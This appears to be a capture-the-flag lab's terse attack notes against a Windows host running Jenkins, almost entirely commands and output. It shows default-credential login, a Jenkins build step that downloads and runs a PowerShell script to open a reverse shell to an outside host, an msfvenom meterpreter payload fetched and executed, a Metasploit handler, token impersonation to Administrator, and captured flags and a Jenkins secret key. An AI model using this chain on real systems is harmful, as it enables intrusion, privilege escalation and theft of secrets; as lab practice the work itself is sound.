10.10.158.201

nmap 10.10.158.201 -Pn
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
MAC Address: 02:76:AC:E9:5A:A1 (Unknown)

nmap -p80,3389,8080 -sV -O -A -Pn 10.10.158.201
 login admin:admin

Jenkins 2.190.1

Dashboard -> Project 1 -> Configure -> Build Commands
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.113:8001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.113 -Port 9001

ncat -lvnp 9001


Goodies

PS C:\users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0

PS C:\Program Files (x86)\Jenkins> type secret.key
cb2ae36e1862a23b3adfd393282eae76f896f2efb0a4da79643e33afc616751e


msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.16.113:8001/shell-name.exe','shell-name.exe')"

start-process "shell-name.exe"

use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.16.113
set LPORT 9002
run -j
sessions -i 1

whoami /priv (on pwsh reverse shell)

load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrator"
getguid
migrate 668
cat c:\windows\system32\root.txt
dff0f748678f280250f25a45b8046b4a
